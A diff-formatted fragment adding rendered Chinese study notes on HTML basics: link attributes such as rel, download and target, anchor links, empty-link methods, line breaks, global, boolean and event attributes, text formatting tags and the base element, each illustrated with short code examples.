+<li><code>noopener noreferrer</code>: 同时使用<code>noopener</code>和<code>noreferrer</code>。例子: <code>&lt;a href=&quot;https://www.example.com&quot; rel=&quot;noopener noreferrer&quot;&gt;安全链接&lt;/a&gt;</code></li>
+</ul>
+<ul>
+<li>实例</li>
+</ul>
+<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;安全链接&lt;/a&gt;</code></pre>
+<h5 id="download提示浏览器下载链接目标而不是导航到该目标"><a class="markdownIt-Anchor" href="#download提示浏览器下载链接目标而不是导航到该目标"></a> download：提示浏览器下载链接目标而不是导航到该目标。</h5>
+<p>如果指定了文件名，浏览器会提示下载并保存为指定文件名。</p>
+<p>例如：</p>
+<ul>
+<li>实例</li>
+</ul>
+<pre><code class="highlight plaintext">&lt;a href=&quot;file.pdf&quot; download=&quot;example.pdf&quot;&gt;下载文件&lt;/a&gt;</code></pre>
+<h5 id="title定义链接的额外信息当鼠标悬停在链接上时显示的工具提示"><a class="markdownIt-Anchor" href="#title定义链接的额外信息当鼠标悬停在链接上时显示的工具提示"></a> title：定义链接的额外信息，当鼠标悬停在链接上时显示的工具提示。</h5>
+<ul>
+<li>实例</li>
+</ul>
+<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot; title=&quot;访问 Example 网站&quot;&gt;访问 Example&lt;/a&gt;</code></pre>
+<h5 id="id用于链接锚点通常在同一页面中跳转到某个特定位置"><a class="markdownIt-Anchor" href="#id用于链接锚点通常在同一页面中跳转到某个特定位置"></a> id：用于链接锚点，通常在同一页面中跳转到某个特定位置。</h5>
+<ul>
+<li>实例</li>
+</ul>
+<p><em><!-- 链接到页面中的某个部分 --></em><br>
+&lt;<strong>a</strong> href=“#section1”&gt;跳转到第1部分&lt;/<strong>a</strong>&gt;<br>
+&lt;<strong>div</strong> id=“section1”&gt;这是第1部分&lt;/<strong>div</strong>&gt;</p>
+<h5 id="hreflang-指定链接的目标url的语言"><a class="markdownIt-Anchor" href="#hreflang-指定链接的目标url的语言"></a> hreflang: 指定链接的目标URL的语言</h5>
+<ul>
+<li>实例</li>
+</ul>
+<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com/es&quot; hreflang=&quot;es&quot;&gt;访问西班牙语网站&lt;/a&gt;</code></pre>
+<h5 id="type-指定链接资源的mime类型"><a class="markdownIt-Anchor" href="#type-指定链接资源的mime类型"></a> type: 指定链接资源的MIME类型</h5>
+<ul>
+<li>实例</li>
+</ul>
+<pre><code class="highlight plaintext">&lt;a href=&quot;style.css&quot; type=&quot;text/css&quot;&gt;样式表&lt;/a&gt;</code></pre>
+<h5 id="class-用于指定元素的类名css中定义"><a class="markdownIt-Anchor" href="#class-用于指定元素的类名css中定义"></a> class: 用于指定元素的类名（CSS中定义）</h5>
+<ul>
+<li>实例</li>
+</ul>
+<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot; class=&quot;external-link&quot;&gt;外部链接&lt;/a&gt;</code></pre>
+<h5 id="style-直接在元素上定义css样式"><a class="markdownIt-Anchor" href="#style-直接在元素上定义css样式"></a> style: 直接在元素上定义CSS样式</h5>
+<ul>
+<li>实例</li>
+</ul>
+<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot; style=&quot;color: red;&quot;&gt;红色链接&lt;/a&gt;</code></pre>
+<hr>
+<h4 id="实例"><a class="markdownIt-Anchor" href="#实例"></a> <strong>实例</strong></h4>
+<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.runoob.com/&quot;&gt;访问菜鸟教程&lt;/a&gt;</code></pre>
+<p>上面这行代码显示为：<a href="https://www.runoob.com/">访问菜鸟教程</a></p>
+<p>点击这个超链接会把用户带到菜鸟教程的首页。</p>
+<p><strong>提示:</strong> <em>“链接文本”</em> 不必一定是文本。图片或其他 HTML 元素都可以成为链接。</p>
+<p>**文本链接：**最常见的链接类型是文本链接，它使用 <a> 元素将一段文本转化为可点击的链接，例如：</a></p>
+<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot;&gt;访问示例网站&lt;/a&gt;</code></pre>
+<p>**图像链接：**您还可以使用图像作为链接。在这种情况下，<a> 元素包围着 <img> 元素。例如：</a></p>
+<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot;&gt;
+  &lt;img src=&quot;example.jpg&quot; alt=&quot;示例图片&quot;&gt;
+&lt;/a&gt;</code></pre>
+<p>**锚点链接：**除了链接到其他网页外，您还可以在同一页面内创建内部链接，这称为锚点链接。要创建锚点链接，需要在目标位置使用 <a> 元素定义一个标记，并使用#符号引用该标记。例如：</a></p>
+<pre><code class="highlight plaintext">&lt;a href=&quot;#section2&quot;&gt;跳转到第二部分&lt;/a&gt;
+&lt;!-- 在页面中的某个位置 --&gt;
+&lt;a name=&quot;section2&quot;&gt;&lt;/a&gt;</code></pre>
+<p>**下载链接：**如果您希望链接用于下载文件而不是导航到另一个网页，可以使用 download 属性。例如：</p>
+<pre><code class="highlight plaintext">&lt;a href=&quot;document.pdf&quot; download&gt;下载文档&lt;/a&gt;</code></pre>
+<hr>
+<h4 id="html-链接-target-属性"><a class="markdownIt-Anchor" href="#html-链接-target-属性"></a> HTML 链接 - target 属性</h4>
+<p>使用 target 属性，你可以定义被链接的文档在何处显示。</p>
+<p>下面的这行会在新窗口打开文档：</p>
+<ul>
+<li>实例</li>
+</ul>
+<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.runoob.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;访问菜鸟教程!&lt;/a&gt;</code></pre>
+<hr>
+<h4 id="html-链接-id-属性"><a class="markdownIt-Anchor" href="#html-链接-id-属性"></a> HTML 链接- id 属性</h4>
+<p>id 属性可用于创建一个 HTML 文档书签。</p>
+<p><strong>提示:</strong> 书签不会以任何特殊方式显示，即在 HTML 页面中是不显示的，所以对于读者来说是隐藏的。</p>
+<ul>
+<li>实例</li>
+</ul>
+<p>在HTML文档中插入ID:</p>
+<pre><code class="highlight plaintext">&lt;a id=&quot;tips&quot;&gt;有用的提示部分&lt;/a&gt;</code></pre>
+<p>在HTML文档中创建一个链接到&quot;有用的提示部分(id=“tips”）&quot;：</p>
+<pre><code class="highlight plaintext">&lt;a href=&quot;#tips&quot;&gt;访问有用的提示部分&lt;/a&gt;</code></pre>
+<p>或者，从另一个页面创建一个链接到&quot;有用的提示部分(id=“tips”）&quot;：</p>
+<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.runoob.com/html/html-links.html#tips&quot;&gt;
+访问有用的提示部分&lt;/a&gt;</code></pre>
+<hr>
+<h4 id="空链接"><a class="markdownIt-Anchor" href="#空链接"></a> 空链接</h4>
+<p>以下是常见的几种设置空链接的方法，以及它们之间的区别：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">方法</th>
+<th style="text-align:left">作用</th>
+<th style="text-align:left">是否会跳转</th>
+<th style="text-align:left">场景适用性</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><code>href=&quot;#&quot;</code></td>
+<td style="text-align:left">导航到页面顶部</td>
+<td style="text-align:left">是</td>
+<td style="text-align:left">占位符，捕获点击事件</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>href=&quot;javascript:void(0)&quot;</code></td>
+<td style="text-align:left">阻止默认行为，不刷新页面</td>
+<td style="text-align:left">否</td>
+<td style="text-align:left">阻止跳转，配合 JS 使用</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>href=&quot;&quot;</code></td>
+<td style="text-align:left">刷新当前页面</td>
+<td style="text-align:left">是</td>
+<td style="text-align:left">需要页面刷新时</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>href=&quot;about:blank&quot;</code></td>
+<td style="text-align:left">打开空白页面</td>
+<td style="text-align:left">是</td>
+<td style="text-align:left">新窗口打开空白页面</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>role=&quot;button&quot;</code></td>
+<td style="text-align:left">链接表现为按钮，无默认行为</td>
+<td style="text-align:left">否</td>
+<td style="text-align:left">配合 JS 实现按钮功能，无跳转</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h4 id="基本的注意事项-有用的提示"><a class="markdownIt-Anchor" href="#基本的注意事项-有用的提示"></a> 基本的注意事项 - 有用的提示</h4>
+<p><strong>注释：</strong> 请始终将正斜杠添加到子文件夹。假如这样书写链接：href=“<a href="https://www.runoob.com/html">https://www.runoob.com/html</a>”，就会向服务器产生两次 HTTP 请求。这是因为服务器会添加正斜杠到这个地址，然后创建一个新的请求，就像这样：href=“<a href="https://www.runoob.com/html/">https://www.runoob.com/html/</a>”。</p>
+<h3 id="html-图像"><a class="markdownIt-Anchor" href="#html-图像"></a> <strong>HTML 图像</strong></h3>
+<p>HTML 图像是通过标签 <code>&lt;img&gt; </code>来定义的.</p>
+<ul>
+<li>实例</li>
+</ul>
+<pre><code class="highlight plaintext">&lt;img src=&quot;images/logo.png&quot; width=&quot;258&quot; height=&quot;39&quot; /&gt;</code></pre>
+<p><strong>注意：</strong> 图像的名称和尺寸是以属性的形式提供的。</p>
+<h3 id="html换行"><a class="markdownIt-Anchor" href="#html换行"></a> <strong>HTML换行</strong></h3>
+<p>HTML换行是通过<code>&lt;br&gt;</code> 来定义的</p>
+<p>如果您希望在不产生一个新段落的情况下进行换行（新行），请使用 <code>&lt;br&gt;</code> 标签：</p>
+<ul>
+<li>实例</li>
+</ul>
+<pre><code class="highlight html"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这个<span class="tag">&lt;<span class="name">br</span>&gt;</span>段落<span class="tag">&lt;<span class="name">br</span>&gt;</span>演示了分行的效果<span class="tag">&lt;/<span class="name">p</span>&gt;</span></code></pre>
+<p><code>&lt;br /&gt;</code> 元素是一个空的 HTML 元素。由于关闭标签没有任何意义，因此它没有结束标签。</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250316094200892.png" alt="image-20250316094200892"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250316094136106.png" alt="image-20250316094136106"></p>
+<pre><code class="highlight plaintext">区分一下： &lt;br&gt;, &lt;br/&gt; 以及 &lt;br /&gt;（带有空格）
+
+&lt;br&gt; 是 HTML 写法。&lt;br/&gt;是 XHTML1.1 的写法, 也是 XML 写法。&lt;br /&gt; 是 XHTML 为兼容 HTML 的写法,也是 XML 写法。HTML5 因为兼容 XHTML，所以三种写法都可以使用。
+
+早期发布的 HTML 规范当中，&lt;br&gt; 与 &lt;img&gt; 等元素是不用封闭自身的，但是这种元素造成了 HTML 规范的不严谨，于是在之后发布的 XHTML 语言中，参考了更为严谨的 XML 规范，在这些不用自身封闭的元素后加 / 来表示自行封闭，在逻辑上来讲等同于&lt;br&gt;....&lt;/br&gt;（但是没有 &lt;/br&gt; 这种写法），这样一来保证了较少的代码量，二来保证了规范的严谨。</code></pre>
+<h3 id="html-空元素"><a class="markdownIt-Anchor" href="#html-空元素"></a> <strong>HTML 空元素</strong></h3>
+<p>没有内容的 HTML 元素被称为空元素。空元素是在开始标签中关闭的。</p>
+<p><code>&lt;br&gt;</code> 就是没有关闭标签的空元素（<code>&lt;br&gt;</code> 标签定义换行）。</p>
+<p>在 XHTML、XML 以及未来版本的 HTML 中，所有元素都必须被关闭。</p>
+<p>在开始标签中添加斜杠，比如<code> &lt;br /&gt;</code>，是关闭空元素的正确方法，HTML、XHTML 和 XML 都接受这种方式。</p>
+<p>即使<code> &lt;br&gt;</code> 在所有浏览器中都是有效的，但使用 <code>&lt;br /&gt;</code> 其实是更长远的保障。</p>
+<blockquote>
+<p>[!TIP]</p>
+<p>即使忘记使用结束标签，大部分浏览器也会正确地显示HTML，但是依赖这种做法(指不要当懒狗)，最好闭合一下标签，忘记使用结束标签会产生不可预料的结果或错误</p>
+</blockquote>
+<p><strong>tip</strong>：可以的话建议使用小写标签</p>
+<h2 id="html属性"><a class="markdownIt-Anchor" href="#html属性"></a> HTML属性</h2>
+<p>属性是 HTML 元素提供的附加信息。</p>
+<p>属性通常出现在 HTML 标签的开始标签中，用于定义元素的行为、样式、内容或其他特性。</p>
+<p>属性总是以 <strong>name=“value”</strong> 的形式写在标签内，<strong>name</strong> 是属性的名称，<strong>value</strong> 是属性的值。</p>
+<hr>
+<p><strong>HTML 属性</strong></p>
+<ul>
+<li>HTML 元素可以设置<strong>属性</strong></li>
+<li>属性可以在元素中添加<strong>附加信息</strong></li>
+<li>属性一般描述于<strong>开始标签</strong></li>
+<li>属性总是以名称/值对的形式出现，<strong>比如：name=“value”</strong>。</li>
+</ul>
+<hr>
+<p>属性实例</p>
+<p>HTML 链接由 <a> 标签定义。链接的地址在 <strong>href 属性</strong>中指定：</a></p>
+<p>实例</p>
+<pre><code class="highlight plaintext">&lt;a href=&quot;http://www.runoob.com&quot;&gt;这是一个链接&lt;/a&gt;</code></pre>
+<hr>
+<p><strong>HTML 属性常用引用属性值</strong></p>
+<p>属性值应该始终被包括在引号内。</p>
+<p>双引号是最常用的，不过使用单引号也没有问题。</p>
+<p>使用双引号：</p>
+<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.runoob.com&quot;&gt;Link&lt;/a&gt;</code></pre>
+<p>使用单引号：</p>
+<pre><code class="highlight plaintext">&lt;a href=&#x27;https://www.runoob.com&#x27;&gt;Link&lt;/a&gt;</code></pre>
+<p>属性值包含引号： <code>Link</code></p>
+<blockquote>
+<p><strong>提示:</strong> 在某些个别的情况下，比如属性值本身就含有双引号，那么您必须使用单引号，例如：</p>
+<pre><code class="highlight plaintext">name=&#x27;John &quot;ShotGun&quot; Nelson&#x27;</code></pre>
+<p>或者：</p>
+<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.runoob.com?q=&#x27;search&#x27;&quot;&gt;Link&lt;/a&gt;</code></pre>
+</blockquote>
+<hr>
+<p><strong>HTML 提示：使用小写属性</strong></p>
+<p>属性和属性值对大小写不敏感。</p>
+<p>不过，万维网联盟在其 HTML 4 推荐标准中推荐小写的属性/属性值。</p>
+<p>而新版本的 (X)HTML 要求使用小写属性。</p>
+<hr>
+<p><strong>HTML 属性参考手册</strong></p>
+<p>查看完整的HTML属性列表: <a href="https://www.runoob.com/tags/html-reference.html">HTML 标签参考手册</a>。</p>
+<p>下面列出了适用于大多数 HTML 元素的属性：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">属性名</th>
+<th style="text-align:left">适用元素</th>
+<th style="text-align:left">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><code>id</code></td>
+<td style="text-align:left">所有元素</td>
+<td style="text-align:left">为元素指定唯一的标识符。</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>class</code></td>
+<td style="text-align:left">所有元素</td>
+<td style="text-align:left">为元素指定一个或多个类名，用于 CSS 或 JavaScript 选择。</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>style</code></td>
+<td style="text-align:left">所有元素</td>
+<td style="text-align:left">直接在元素上应用 CSS 样式。</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>title</code></td>
+<td style="text-align:left">所有元素</td>
+<td style="text-align:left">为元素提供额外的提示信息，通常在鼠标悬停时显示。</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>data-*</code></td>
+<td style="text-align:left">所有元素</td>
+<td style="text-align:left">用于存储自定义数据，通常通过 JavaScript 访问。</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>href</code></td>
+<td style="text-align:left"><code>&lt;a&gt;</code>, <code>&lt;link&gt;</code></td>
+<td style="text-align:left">指定链接的目标 URL。</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>src</code></td>
+<td style="text-align:left"><code>&lt;img&gt;</code>, <code>&lt;script&gt;</code>, <code>&lt;iframe&gt;</code></td>
+<td style="text-align:left">指定外部资源（如图片、脚本、框架）的 URL。</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>alt</code></td>
+<td style="text-align:left"><code>&lt;img&gt;</code></td>
+<td style="text-align:left">为图像提供替代文本，当图像无法显示时显示。</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>type</code></td>
+<td style="text-align:left"><code>&lt;input&gt;</code>, <code>&lt;button&gt;</code></td>
+<td style="text-align:left">指定输入控件的类型（如 <code>text</code>, <code>password</code>, <code>checkbox</code> 等）。</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>value</code></td>
+<td style="text-align:left"><code>&lt;input&gt;</code>, <code>&lt;button&gt;</code>, <code>&lt;option&gt;</code></td>
+<td style="text-align:left">指定元素的初始值。</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>disabled</code></td>
+<td style="text-align:left">表单元素</td>
+<td style="text-align:left">禁用元素，使其不可交互。</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>checked</code></td>
+<td style="text-align:left"><code>&lt;input type=&quot;checkbox&quot;&gt;</code>, <code>&lt;input type=&quot;radio&quot;&gt;</code></td>
+<td style="text-align:left">指定复选框或单选按钮是否被选中。</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>placeholder</code></td>
+<td style="text-align:left"><code>&lt;input&gt;</code>, <code>&lt;textarea&gt;</code></td>
+<td style="text-align:left">在输入框中显示提示文本。</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>target</code></td>
+<td style="text-align:left"><code>&lt;a&gt;</code>, <code>&lt;form&gt;</code></td>
+<td style="text-align:left">指定链接或表单提交的目标窗口或框架（如 <code>_blank</code> 表示新标签页）。</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>readonly</code></td>
+<td style="text-align:left">表单元素</td>
+<td style="text-align:left">使输入框只读。</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>required</code></td>
+<td style="text-align:left">表单元素</td>
+<td style="text-align:left">指定输入字段为必填项。</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>autoplay</code></td>
+<td style="text-align:left"><code>&lt;audio&gt;</code>, <code>&lt;video&gt;</code></td>
+<td style="text-align:left">自动播放媒体。</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>onclick</code></td>
+<td style="text-align:left">所有元素</td>
+<td style="text-align:left">当用户点击元素时触发 JavaScript 事件。</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>onmouseover</code></td>
+<td style="text-align:left">所有元素</td>
+<td style="text-align:left">当用户将鼠标悬停在元素上时触发 JavaScript 事件。</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>onchange</code></td>
+<td style="text-align:left">表单元素</td>
+<td style="text-align:left">当元素的值发生变化时触发 JavaScript 事件。</td>
+</tr>
+</tbody>
+</table>
+<h3 id="全局属性"><a class="markdownIt-Anchor" href="#全局属性"></a> 全局属性</h3>
+<p>全局属性是所有 HTML 元素都可以使用的属性。</p>
+<p><strong>id</strong>：为元素指定唯一的标识符。(基于<code>css</code>的属性,纯粹使用&lt; DIV &gt;标签而不加任何CSS内容，其效果与用&lt; p&gt;&lt; /p &gt;是一样的。)</p>
+<pre><code class="highlight plaintext">&lt;div id=&quot;header&quot;&gt;This is the header&lt;/div&gt;</code></pre>
+<p><strong>class</strong>：为元素指定一个或多个类名，用于 CSS 或 JavaScript 选择。</p>
+<pre><code class="highlight plaintext">&lt;p class=&quot;text highlight&quot;&gt;This is a highlighted text.&lt;/p&gt;</code></pre>
+<p><strong>style</strong>：用于直接在元素上应用 CSS 样式。</p>
+<pre><code class="highlight plaintext">&lt;p style=&quot;color: blue; font-size: 14px;&quot;&gt;This is a styled paragraph.&lt;/p&gt;</code></pre>
+<p><strong>title</strong>：为元素提供额外的提示信息，通常在鼠标悬停时显示。</p>
+<pre><code class="highlight plaintext">&lt;abbr title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/abbr&gt;</code></pre>
+<p><strong>data-*</strong>：用于存储自定义数据，通常通过 JavaScript 访问。</p>
+<pre><code class="highlight plaintext">&lt;div data-user-id=&quot;12345&quot;&gt;User Info&lt;/div&gt;</code></pre>
+<h3 id="特定元素的属性"><a class="markdownIt-Anchor" href="#特定元素的属性"></a> 特定元素的属性</h3>
+<p>某些属性仅适用于特定的 HTML 元素。</p>
+<p><strong><code>href</code></strong>（用于 <code>&lt;a&gt;</code> 和 <code>&lt;link&gt;</code> 元素）：指定链接的目标 URL。</p>
+<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot;&gt;Visit Example&lt;/a&gt;</code></pre>
+<p><strong><code>src</code></strong>（用于 <code>&lt;img&gt;</code>, <code>&lt;script&gt;</code>, <code>&lt;iframe&gt;</code> 等元素）：指定外部资源的 URL。</p>
+<pre><code class="highlight plaintext">&lt;img src=&quot;image.jpg&quot; alt=&quot;An example image&quot;&gt;</code></pre>
+<p><strong><code>alt</code></strong>（用于 <code>&lt;img&gt;</code> 元素）：为图像提供替代文本，当图像无法显示时显示。</p>
+<pre><code class="highlight plaintext">&lt;img src=&quot;image.jpg&quot; alt=&quot;An example image&quot;&gt;</code></pre>
+<p><strong><code>type</code></strong>（用于 <code>&lt;input&gt;</code> 和 <code>&lt;button&gt;</code> 元素）：指定输入控件的类型。</p>
+<pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; placeholder=&quot;Enter your name&quot;&gt;</code></pre>
+<p><strong><code>value</code></strong>（用于 <code>&lt;input&gt;</code>, <code>&lt;button&gt;</code>, <code>&lt;option&gt;</code> 等元素）：指定元素的初始值。</p>
+<pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; value=&quot;Default Value&quot;&gt;</code></pre>
+<p><strong><code>disabled</code></strong>（用于表单元素）：禁用元素，使其不可交互。</p>
+<pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; disabled&gt;</code></pre>
+<p><strong><code>checked</code></strong>（用于 <code>&lt;input type=&quot;checkbox&quot;&gt;</code> 和 <code>&lt;input type=&quot;radio&quot;&gt;</code>）：指定复选框或单选按钮是否被选中。</p>
+<pre><code class="highlight plaintext">&lt;input type=&quot;checkbox&quot; checked&gt;</code></pre>
+<p><strong><code>placeholder</code></strong>（用于 <code>&lt;input&gt;</code> 和 <code>&lt;textarea&gt;</code> 元素）：在输入框中显示提示文本。</p>
+<pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; placeholder=&quot;Enter your email&quot;&gt;</code></pre>
+<p><strong><code>target</code></strong>（用于 <code>&lt;a&gt;</code> 和 <code>&lt;form&gt;</code> 元素）：指定链接或表单提交的目标窗口或框架。</p>
+<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot; target=&quot;_blank&quot;&gt;Open in new tab&lt;/a&gt;</code></pre>
+<h3 id="布尔属性"><a class="markdownIt-Anchor" href="#布尔属性"></a> 布尔属性</h3>
+<p>布尔属性是指不需要值的属性，它们的存在即表示 true，不存在则表示 false。</p>
+<p><strong>disabled</strong>：禁用元素。</p>
+<pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; disabled&gt;</code></pre>
+<p><strong>readonly</strong>：使输入框只读。</p>
+<pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; readonly&gt;</code></pre>
+<p><strong>required</strong>：指定输入字段为必填项。</p>
+<pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; required&gt;</code></pre>
+<p><strong><code>autoplay</code></strong>（用于 <code>&lt;audio&gt;</code> 和 <code>&lt;video&gt;</code> 元素）：自动播放媒体。</p>
+<pre><code class="highlight plaintext">&lt;video src=&quot;video.mp4&quot; autoplay&gt;&lt;/video&gt;</code></pre>
+<h3 id="自定义属性"><a class="markdownIt-Anchor" href="#自定义属性"></a> 自定义属性</h3>
+<p>HTML5 引入了 <strong>data-*</strong> 属性，允许开发者自定义属性来存储额外的数据。</p>
+<p><strong>data-*</strong>：用于存储自定义数据，通常通过 JavaScript 访问。</p>
+<pre><code class="highlight plaintext">&lt;div data-user-id=&quot;12345&quot; data-role=&quot;admin&quot;&gt;User Info&lt;/div&gt;</code></pre>
+<h3 id="事件处理属性"><a class="markdownIt-Anchor" href="#事件处理属性"></a> 事件处理属性</h3>
+<p>HTML 元素可以通过事件处理属性来响应特定的事件，如点击、鼠标悬停等。</p>
+<p><strong>onclick</strong>：当用户点击元素时触发。</p>
+<pre><code class="highlight plaintext">&lt;button onclick=&quot;alert(&#x27;Button clicked!&#x27;)&quot;&gt;Click Me&lt;/button&gt;</code></pre>
+<p><strong>onmouseover</strong>：当用户将鼠标悬停在元素上时触发。</p>
+<pre><code class="highlight plaintext">&lt;div onmouseover=&quot;this.style.backgroundColor=&#x27;yellow&#x27;&quot;&gt;Hover over me&lt;/div&gt;</code></pre>
+<p><strong>onchange</strong>：当元素的值发生变化时触发。</p>
+<pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; onchange=&quot;alert(&#x27;Value changed!&#x27;)&quot;&gt;</code></pre>
+<h2 id="为网页加亿点点细节"><a class="markdownIt-Anchor" href="#为网页加亿点点细节"></a> 为网页加亿点点细节</h2>
+<h3 id="水平线"><a class="markdownIt-Anchor" href="#水平线"></a> 水平线</h3>
+<p><code>&lt;hr&gt;</code> 标签在 HTML 页面中创建水平线。</p>
+<p><code>hr </code>元素可用于分隔内容。</p>
+<h3 id="注释"><a class="markdownIt-Anchor" href="#注释"></a> 注释</h3>
+<p>可以将注释插入 HTML 代码中，这样可以提高其可读性，使代码更易被人理解。浏览器会忽略注释，也不会显示它们。</p>
+<p>注释写法如下:</p>
+<ul>
+<li>实例</li>
+</ul>
+<!-- 这是一个注释 -->
+<p><strong>注释:</strong> 开始括号之后（左边的括号）需要紧跟一个叹号 <strong>!</strong> (英文标点符号)，结束括号之前（右边的括号）不需要，合理地使用注释可以对未来的代码编辑工作产生帮助。</p>
+<h3 id="字体"><a class="markdownIt-Anchor" href="#字体"></a> 字体</h3>
+<h4 id="html-文本格式化标签"><a class="markdownIt-Anchor" href="#html-文本格式化标签"></a> HTML 文本格式化标签</h4>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">标签</th>
+<th style="text-align:left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><b></b></td>
+<td style="text-align:left">定义粗体文本</td>
+</tr>
+<tr>
+<td style="text-align:left"><em>(大号斜体)</em></td>
+<td style="text-align:left">定义着重文字</td>
+</tr>
+<tr>
+<td style="text-align:left"><i></i></td>
+<td style="text-align:left">定义斜体字</td>
+</tr>
+<tr>
+<td style="text-align:left"><small></small></td>
+<td style="text-align:left">定义小号字</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>(加粗)</strong></td>
+<td style="text-align:left">定义加重语气</td>
+</tr>
+<tr>
+<td style="text-align:left"><sub></sub></td>
+<td style="text-align:left">定义下标字</td>
+</tr>
+<tr>
+<td style="text-align:left"><sup></sup></td>
+<td style="text-align:left">定义上标字</td>
+</tr>
+<tr>
+<td style="text-align:left"><ins>(下划线)</ins></td>
+<td style="text-align:left">定义插入字</td>
+</tr>
+<tr>
+<td style="text-align:left"><del>(横线)</del></td>
+<td style="text-align:left">定义删除字</td>
+</tr>
+</tbody>
+</table>
+<h4 id="html-计算机输出-标签"><a class="markdownIt-Anchor" href="#html-计算机输出-标签"></a> HTML “计算机输出” 标签</h4>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">标签</th>
+<th style="text-align:left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><code></code></td>
+<td style="text-align:left">定义计算机代码</td>
+</tr>
+<tr>
+<td style="text-align:left"><kbd></kbd></td>
+<td style="text-align:left">定义键盘码</td>
+</tr>
+<tr>
+<td style="text-align:left"><samp></samp></td>
+<td style="text-align:left">定义计算机代码样本</td>
+</tr>
+<tr>
+<td style="text-align:left"><var></var></td>
+<td style="text-align:left">定义变量</td>
+</tr>
+<tr>
+<td style="text-align:left"><pre></pre></td>
+<td style="text-align:left">定义预格式文本</td>
+</tr>
+</tbody>
+</table>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250316125805549.png" alt="image-20250316125805549"></p>
+<h4 id="html-引文-引用-及标签定义"><a class="markdownIt-Anchor" href="#html-引文-引用-及标签定义"></a> HTML 引文, 引用, 及标签定义</h4>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">标签</th>
+<th style="text-align:left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><abdr><acronym></acronym></abdr></td>
+<td style="text-align:left">定义缩写</td>
+</tr>
+<tr>
+<td style="text-align:left"><address></address></td>
+<td style="text-align:left">定义地址</td>
+</tr>
+<tr>
+<td style="text-align:left"><bdo></bdo></td>
+<td style="text-align:left">定义文字方向</td>
+</tr>
+<tr>
+<td style="text-align:left"><blockquote></blockquote></td>
+<td style="text-align:left">定义长的引用</td>
+</tr>
+<tr>
+<td style="text-align:left"><q></q></td>
+<td style="text-align:left">定义短的引用语</td>
+</tr>
+<tr>
+<td style="text-align:left"><cite></cite></td>
+<td style="text-align:left">定义引用、引证</td>
+</tr>
+<tr>
+<td style="text-align:left"><dfn></dfn></td>
+<td style="text-align:left">定义一个定义项目。</td>
+</tr>
+</tbody>
+</table>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250316125715542.png" alt="image-20250316125715542"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250316132652922.png" alt="image-20250316132652922"></p>
+<h2 id="html-头部"><a class="markdownIt-Anchor" href="#html-头部"></a> HTML 头部</h2>
+<h3 id="html-base-元素"><a class="markdownIt-Anchor" href="#html-base-元素"></a> HTML base 元素</h3>
+<p><code>&lt;base&gt;</code> 标签描述了基本的链接地址/链接目标，该标签作为HTML文档中所有的链接标签的默认链接:</p>
+<ul>
+<li>实例</li>
+</ul>
